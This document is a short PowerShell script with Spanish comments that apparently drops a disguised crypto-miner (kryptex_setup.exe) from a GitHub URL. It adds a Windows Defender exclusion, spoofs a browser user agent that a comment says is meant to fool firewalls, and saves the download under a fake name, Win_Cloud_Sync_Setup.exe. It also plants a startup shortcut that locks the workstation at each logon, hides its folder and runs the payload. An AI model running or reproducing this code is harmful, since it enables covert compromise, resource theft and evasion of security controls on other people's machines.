# --- CONFIGURACIÓN ---
$url_exe = "https://raw.githubusercontent.com/DmI29/rapidman/main/kryptex_setup.exe"
$dir = "C:\System_Log_Service"
$exePath = "$dir\Win_Cloud_Sync_Setup.exe"

# 1. Crear carpeta y exclusión de Antivirus
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir }
Add-MpPreference -ExclusionPath $dir

# 2. Descargar con método alternativo (System.Net.WebClient)
Write-Host "Iniciando descarga forzada..." -ForegroundColor Cyan
try {
    $client = New-Object System.Net.WebClient
    # Esto engaña a los firewalls haciéndoles creer que es un navegador viejo
    $client.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)")
    $client.DownloadFile($url_exe, $exePath)
    Write-Host "Descarga exitosa." -ForegroundColor Green
} catch {
    Write-Host "Error crítico en la red de la oficina. Revisa el bloqueo de firewall." -ForegroundColor Red
}

# 3. Crear el Bloqueo Automático
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$s = New-Object -ComObject WScript.Shell
$shortcut = $s.CreateShortcut("$startupPath\WinServiceLock.lnk")
$shortcut.TargetPath = "rundll32.exe"
$shortcut.Arguments = "user32.dll,LockWorkStation"
$shortcut.Save()

# 4. Ocultar carpeta
attrib +s +h $dir

# 5. Ejecutar solo si el archivo existe
if (Test-Path $exePath) {
    Start-Process -FilePath $exePath
}
